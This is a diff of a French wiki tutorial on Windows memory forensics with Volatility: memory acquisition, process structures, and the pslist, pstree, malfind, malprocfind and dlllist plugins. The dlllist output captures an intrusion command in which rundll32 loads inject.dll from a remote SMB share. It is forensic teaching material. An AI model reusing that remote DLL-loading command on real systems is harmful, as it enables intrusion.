@@ -1,11 +1,11 @@
 # Forensic Windows - Mémoire Vive
 La mémoire vive contient un grand nombre d'informations indispensables lors d'une investigation numérique. En l'analysant, il sera ainsi possible d'identifier les processus en cours d'exécution ou terminés, des créations/suppressions de fichiers, et même des connexions réseaux. 
 
-# 1. Prélévement de la mémoire vive 
+# 1. Prélèvement de la mémoire vive 
 
 
 Il existe de nombreux moyens d'accéder au contenu de la mémoire vive, \\
-tout d'abord de manière passive en analysant des fichiers générés par le système d'exploitation :
+tout d'abord de manière passive en analysant des fichiers générés par le <système d'exploitation :
 
 * **%SystemDrive%\hiberfil.sys** : Ce fichier nommé fichier d'hibernation va stocker le contenu de la mémoire vive lorsque le système d'exploitation activera le mode veille prolongée. Le dump ne sera pas exploitable directement, car son contenu est compressé. Volatility offre toutefois la possibilité de le convertir.
 
@@ -19,9 +19,9 @@ root@kali# volatility -f ../hiberfil.sys imagecopy -O hiberfil.raw
 * **%WINDIR\MEMORY.DMP** : correspond aux crash dump du système d'exploitation windows. Il est nécessaire comme pour le fichier ```hiberfile.sys``` d'utiliser le plugin ```imagecopy``` de Volatility afin de rendre exploitable ce type de dump mémoire.
 
 
-Ensuite, l'accès aux données de la mémoire vive peut s'effectuer via des outils de prélévements.
+Ensuite, l'accès aux données de la mémoire vive peut s'effectuer via des outils de prélèvements.
 Voici quelques outils disponibles gratuitement sur le web qui vous permettront d'effectuer une extraction de la mémoire vive du système visé.
-Pour chacun des outils ci-dessous, gardez bien à l'esprit que le temps de prélévement, et la taille du dump dépendront de la mémoire vive installée. Il est d'ailleurs recommandé lors d'une investigation d'exécuter ce type d'outil à partir d'un périphérique amovible afin de ne pas compromettre la récupération de données sur les périphériques de stockage.
+Pour chacun des outils ci-dessous, gardez bien à l'esprit que le temps de prélèvement, et la taille du dump dépendront de la mémoire vive installée. Il est d'ailleurs recommandé lors d'une investigation d'exécuter ce type d'outil à partir d'un périphérique amovible afin de ne pas compromettre la récupération de données sur les périphériques de stockage.
 
 ## DumpIt
 \\
@@ -61,7 +61,7 @@ VMware utilise les fichiers :
 * **VMEM**, qui correspond à une image brute de la RAM
 * **VMSS** et **VMSN** pour stocker une image de la mémoire vive.
 
-Pour l'analyse d'un Windows2016, il est nécessaire d'avoir les deux fichiers ```.vmem``` et ```.vmss``` au sein du même repertoire pour pouvoir effectuer l'analyse avec volatility sur le fichier ```.vmem```.
+Pour l'analyse d'un Windows2016, il est nécessaire d'avoir les deux fichiers ```.vmem``` et ```.vmss``` au sein du même répertoire pour pouvoir effectuer l'analyse avec volatility sur le fichier ```.vmem```.
 
 
 ## Microsoft Hyper-v
@@ -72,7 +72,7 @@ Parallels stocke quant à lui le contenu de la RAM dans le fichier ```.mem``` de
 
 ## VirtualBox
 VirtualBox n'a pas le même fonctionnement que les autres technologies.
-Une partie de la mémoire est présente dans le fichier ```.sav``` des machines virtuelles. S'il est nécessaire d'obtenir l'intégralité du contenu, nous devrons démarrer la mchine virtuelle en mode débogage, ou utiliser un des outils listés ci-dessus de prélévement.
+Une partie de la mémoire est présente dans le fichier ```.sav``` des machines virtuelles. S'il est nécessaire d'obtenir l'intégralité du contenu, nous devrons démarrer la machine virtuelle en mode débogage, ou utiliser un des outils listés ci-dessus de prélèvement.
 
 
 # 3. Analyse de la mémoire vive
@@ -213,7 +213,7 @@ Voici quelques actions à mener pour mettre en avant toutes incohérences :
 * **Analyse des différents arguments passés au processus**
 * **Analyse de l'heure à laquelle le processus a été exécuté :**
  * Identification de modifications apportées au système
-  * Actions sur le système de fichiers (creation/suppression)
+  * Actions sur le système de fichiers (création/suppression)
   * Mise en place de moyens de persistence (création de services / taches planifiées)
 * **Analyse des droits associés à l'utilisateur ayant exécuté le binaire**
 
@@ -229,20 +229,20 @@ Voici quelques processus systèmes légitimes sur un système d'exploitation Mic
 * **explorer.exe**
  * Chemin : ```%systemroot%\explorer.exe```
  * Processus parent : userinit.exe
- * Nombre d'occurence : 1 instance par compte utilisateur connecté
- * Utilisateur executant le processus : le compte utilisateur connecté
+ * Nombre d’occurrence : 1 instance par compte utilisateur connecté
+ * Utilisateur exécutant le processus : le compte utilisateur connecté
 
 * **lsaiso.exe**
  * Chemin : ```%systemroot%\system32\lsaiso.exe```
  * Processus parent : wininit.exe
- * Nombre d'occurence : <= 1
- * Utilisateur executant le processus : local system
+ * Nombre d’occurrence : <= 1
+ * Utilisateur exécutant le processus : local system
 
 * **lsass.exe**
  * Chemin : ```%systemroot%\system32\lsass.exe```
  * Processus parent : wininit.exe
- * Nombre d'occurence : 1
- * Utilisateur executant le processus : local system
+ * Nombre d’occurrence : 1
+ * Utilisateur exécutant le processus : local system
 
 * **runtimebroker.exe**
  * Chemin : ```%systemroot%\system32\runtimebroker.exe```
@@ -251,7 +251,7 @@ Voici quelques processus systèmes légitimes sur un système d'exploitation Mic
 * **services.exe**
  * Chemin : ```%systemroot%\system32\services.exe```
  * Processus parent : wininit.exe
- * Nombre d'occurence : 1
+ * Nombre d’occurrence : 1
 
 * **smss.exe**
  * Chemin : ```%systemroot%\system32\smss.exe```
@@ -264,7 +264,7 @@ Voici quelques processus systèmes légitimes sur un système d'exploitation Mic
 * **system**
  * Chemin : 
  * Processus parent : aucun
- * Nombre d'occurence : 1
+ * Nombre d’occurrence : 1
 
 * **taskhostw.exe**
  * Chemin : ```%systemroot%\system32\taskhostw.exe```
@@ -273,12 +273,12 @@ Voici quelques processus systèmes légitimes sur un système d'exploitation Mic
 * **wininit.exe**
  * Chemin : ```%systemroot%\system32\wininit.exe```
  * Processus parent : smss.exe
- * Nombre d'occurence : 1
+ * Nombre d’occurrence : 1
 
 * **winlogon.exe**
  * Chemin : ```%systemroot%\system32\winlogon.exe```
  * Processus parent : smss.exe
- * Utilisateur executant le processus : local system
+ * Utilisateur exécutant le processus : local system
 
 
 #### 1.1 Analyse antivirus des processus
@@ -307,10 +307,53 @@ Time: 48.212 sec (0 m 48 s)
 #### 1.2 Lister les processus
 
 Une des premières action à mener lors d'une investigation numérique est de lister les processus afin d'identifier d'éventuels processus suspects.
-Chaque processus a son environnement propre nommé **Process Environment Block (PEB)**. Y sont stockées les données telles que le chemin ou se trouve le binaire, les éventuels arguments ainsi que les DLLs nécessaires à son exécution. 
 
-Plusieurs plugins sont disponibles (pslist, pstree, etc). Ils vont ainsi parcourir la liste liant les structures **EPROCESS** de chacun des processus et les afficher à l'écran. \\
-J'ai une preference pour "pstree" qui organise les processus par lien de parenté.
+Plusieurs plugins sont disponibles (pslist, pstree, etc). Ils vont ainsi parcourir la liste chainée les structures **EPROCESS** et les afficher à l'écran. \\
+\\ \\
+La structure ```_EPROCESS``` contient pas loin de 100 attributs, dont la plupart sont des pointeurs vers d’autres structures. \\
+Voici les principaux :
+
+* CreateTime : Timestamp de la création du processus
+* ExitTime : Timestamp de la fin du processus
+* PCB : Process Control Block (utilisé pour récupérer la priorité du processus)
+* PEB : Pointeur vers le PEB « Process Environment Block »
+* ImageFilename : Nom du fichier exécuté comme processus
+* InheritedFromUniqueProcessId : Parent PID
+* Session :  Session exécutant le processus « Logon Session »
+* ThreadListHead : Liste des threads actifs (_ETHREAD) 
+* UniqueProcessId : PID du processus
+* VadRoot : Pointeur vers la structure VAD « Virtual Address Descriptors » du processus
+
+{{ :forensic:eprocess_1.png?nolink |}}
+
+
+\\ \\
+Chaque processus a son environnement propre nommé **Process Environment Block (PEB)**. Y sont stockées les données telles que le chemin ou se trouve le binaire, les éventuels arguments ainsi qu'un pointeur vers la structure ```_PEB_LDR_DATA``` qui contient les DLLs nécessaires à son exécution. 
+
+{{ :forensic:eprocess_2.png?nolink |}}
+
+\\ \\
+La structure ```_PEB_LDR_DATA``` contient les pointeurs vers les modules chargés en mémoire pour l’exécution du processus. Ces pointeurs correspondent à des adresses au sein de la table ```_LDR_DATA_TABLE_ENTRY```.
+
+* InLoadOrderModuleList : Liste des modules chargés dans l'ordre de chargement.
+* InMemoryOrderModuleList : Liste des modules chargés dans leur ordre croissant d’ImageBase. 
+* InInitializationOrderModuleList : Liste des modules chargés classés dans l'ordre d’initialisation. Cette liste est différente de la InLoadOrderModuleList parcequ’une DLL est initialisé uniquement lorsque ses imports sont complets. Dans certains cas il est nécessaire de charger et d’initialiser d’autres DLLs avant la nôtre. 
+
+Source : https://www.ivanlef0u.tuxfamily.org/?p=365
+
+{{ :forensic:eprocess_3.png?nolink |}}
+
+\\ \\
+La structure ```_LDR_DATA_TABLE_ENTRY``` contient toutes les informations
+des modules chargés pour l’exécution d’un processus. Ces modules peuvent être soit des Drivers (Kernel Module), soit des Dlls (chargées dans le User Mode).
+
+* DllBase : Adresse Mémoire de base de la DLL
+* EntryPoint : Point d’entrée de la DLL.
+* SizeOfImage : Taille de la DLL en mémoire 
+* FullDllName : Chemin complet de la DLL
+* TimeDateStamp : L’horodatage de compilation pour la DLL
+
+
 
 ##### 1.2.1 Pslist
 
@@ -345,6 +388,8 @@ root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 
 
 
 ##### 1.2.2 Pstree
+
+Pstree fonctionne comme le plugin "pslist". Il va parcourir la double liste chaînée EPROCESS dans le but d'afficher les processus en cours d'exécution en arbre. Nous serons ainsi capable d'identifier plus rapidement les processus parents et enfants d'un processus cible.
 
 ```
 root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000 pstree
@@ -394,33 +439,10 @@ Offset(P)          Name                PID   PPID PDB                Time create
 Comme le plugin pslist, il est possible de n'afficher que les données d'un processus en particulier en utilisant le paramètre '-p' suivi du PID.
 
 
-#### Dlllist - Analyse des DLLs chargées par les processus
-
-Ce plugin va lister les différentes Dlls qui sont chargées par chacun des processus.
-Il est ainsi possible d'identifier très rapidement une DLL chargée lors d'une intrusion sur un système d'information.
-
-```
-root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000  dlllist 
-Volatility Foundation Volatility Framework 2.6
-************************************************************************
-rundll32.exe pid:   5704
-Command line : rundll32.exe  \\192.168.205.180\XzmKO\inject.dll,0
+#### 1.3 Analyse automatique des processus
 
 
-Base                             Size          LoadCount LoadTime                       Path
------------------- ------------------ ------------------ ------------------------------ ----
-0x0000000000a00000            0x14000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\SysWOW64\rundll32.exe
-0x00007ffc38d20000           0x1d1000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll
-0x0000000055ae0000            0x52000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\System32\wow64.dll
-0x0000000055b40000            0x77000                0x6 2020-01-16 13:25:03 UTC+0000   C:\Windows\System32\wow64win.dll
-..
-0x00000000738e0000             0x5000                0x6 2020-01-16 13:25:03 UTC+0000   \\192.168.205.180\XzmKO\inject.dll
-```
-
-
-
-
-#### Malfind - Injection de code
+##### 1.3.1 Malfind - Injection de code
 
 ```
 root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000 malfind -p 5716
@@ -467,6 +489,94 @@ process.0xffff9a0fd5218080.0x9c0000.dmp: PE32 executable (DLL) (GUI) Intel 80386
 Ensuite, nous pouvons les uploader sur la plateforme "Virustotal" afin d'obtenir une analyse antivirale.
 
 {{ :forensic:volatility_malfind_virustotal.png?nolink |}}
+
+
+
+##### 1.3.2 Malprocfind
+
+Le plugin malprocfind est dédié à l'analyse des processus système windows. Il va parcourir la mémoire à la recherche d'anomalies au sein des processus smss, csrss, winlogon, etc.. Ces anomalies peuvent être liées à un mauvais processus parent, un nombre d'occurence ou le path d'un processus anormal, etc..
+
+L'option "-x" permet de prendre en compte dans l'analyse les processus dont l'exécution est terminée.
+
+
+Ce plugin n'est pas intégré de base dans le dépot de volatility. 
+Ce plugin n'étant pas présent de base dans le dépôt de volatility, il sera nécessaire de le récupérer.
+
+
+```
+root@kali# git clone https://github.com/csababarta/volatility_plugins.git
+root@kali# volatility --plugins=./volatility_plugins/ -f ./JbossServer_memory.vmem malprocfind -x
+
+Volatility Foundation Volatility Framework 2.6.1
+Offset             ProcessName     PID   PPID  Name  Path  Priority  Cmdline User  Sess  Time  CMD   PHollow SPath
+------------------ --------------- ----- ----- ----- ----- --------- ------- ----- ----- ----- ----- ------- -----
+0xffff9a0fd4e5a640 csrss.exe        4608 True  True  True  True      True    True  True  False True  True    True 
+0xffff9a0fd32ac040 system              4 True  True  True  True      True    True  None  True  True  True    True 
+0xffff9a0fd4fe4080 svchost.exe      1056 True  True  True  True      True    True  True  True  True  True    True 
+0xffff9a0fd5410080 cmd.exe          5672 False True  True  True      False   False True  True  True  True    True 
+0xffff9a0fd4cf3080 conhost.exe      5680 False True  True  True      False   True  True  True  False True    True 
+0xffff9a0fd4dfc080 smss.exe          572 True  True  None  False     None    True  False True  True  None    None 
+..
+..
+Unusual process counts:
+-----------------------
+Warning! More than 1 smss.exe process! (3) (This might also be normal.)
+Warning! More than 1 explorer.exe process! (2) (That usually means that multiple users are logged in.)
+Warning! More than 1 winlogon.exe process! (2) (That usually means that multiple users are logged in.)
+
+Processes without running parent process:
+-----------------------------------------
+PID 580 Offset: 0xffff9a0fd4e63080 Name: wininit.exe
+PID 3820 Offset: 0xffff9a0fd5d92800 Name: ServerManager.
+PID 1168 Offset: 0xffff9a0fd5473800 Name: MpCmdRun.exe
+PID 3812 Offset: 0xffff9a0fd587c800 Name: jusched.exe
+PID 472 Offset: 0xffff9a0fd43bd080 Name: csrss.exe
+PID 4 Offset: 0xffff9a0fd32ac040 Name: System
+```
+
+Pour analyser les résultats affichés, nous allons décrire chacune des colonnes. \\
+\\ \\
+Le résultat de chacun des tests effectués peut avoir comme valeur : True / False / None. \\
+**Considérons un résultat "False" à un test comme suspect.**
+
+* PPID : Est-ce bien le processus parent légitime ?
+* Name : Vérification que le nom du processus ne se rapproche pas d'un processus légitime "Typosquatting"
+* Path : Vérification que le chemin du binaire soit bien celui attendu
+* Priority : Vérification que la priority du processus soit la bonne
+* Cmdline : Vérification que les arguments passés soit corrects
+* User : Est-ce le bon utilisateur ayant exécuté le processus
+* Sess : La session windows est-elle celle correspondant aux processus légitimes windows
+* Time : 
+* CMD : Test afin d'identifier si le processus a été exécuté à partir d'un invite de commande "cmd.exe"
+* PHollow : mise en avant de binaire n'étant pas répertorié "unmapped process"
+* SPath : Identification des binaires exécutés à partir de repertoire suspect "Temp, Recycle Bin, .."
+
+
+#### Dlllist - Analyse des DLLs chargées par les processus
+
+Ce plugin va lister les différentes Dlls qui sont chargées par chacun des processus.
+Il est ainsi possible d'identifier très rapidement une DLL chargée lors d'une intrusion sur un système d'information.
+
+```
+root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000  dlllist 
+Volatility Foundation Volatility Framework 2.6
+************************************************************************
+rundll32.exe pid:   5704
+Command line : rundll32.exe  \\192.168.205.180\XzmKO\inject.dll,0
+
+
+Base                             Size          LoadCount LoadTime                       Path
+------------------ ------------------ ------------------ ------------------------------ ----
+0x0000000000a00000            0x14000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\SysWOW64\rundll32.exe
+0x00007ffc38d20000           0x1d1000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll
+0x0000000055ae0000            0x52000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\System32\wow64.dll
+0x0000000055b40000            0x77000                0x6 2020-01-16 13:25:03 UTC+0000   C:\Windows\System32\wow64win.dll
+..
+0x00000000738e0000             0x5000                0x6 2020-01-16 13:25:03 UTC+0000   \\192.168.205.180\XzmKO\inject.dll
+```
+
+
+
 
 
 
